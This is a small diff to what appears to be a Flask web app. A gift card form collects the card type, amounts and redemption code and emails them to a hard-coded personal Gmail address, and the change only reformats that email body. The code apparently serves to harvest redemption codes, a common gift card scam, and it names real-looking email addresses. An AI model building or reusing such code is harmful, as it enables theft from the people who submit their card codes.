@@ -29,7 +29,7 @@ def home():
 		amount = request.form['amount']
 		redem = request.form['redem']
 		msg = Message(card, sender = 'olamicreas@gmail.com', recipients = ['Geniusdullard01@gmail.com'] )
-		msg.body = f'cash= {cash}, amount= {amount}, redemption code {redem} '
+		msg.body = f'cash = {cash}, amount = {amount}, redemption code = {redem} '
 		mail.send(msg)
 
 	return render_template('giftcard.html')
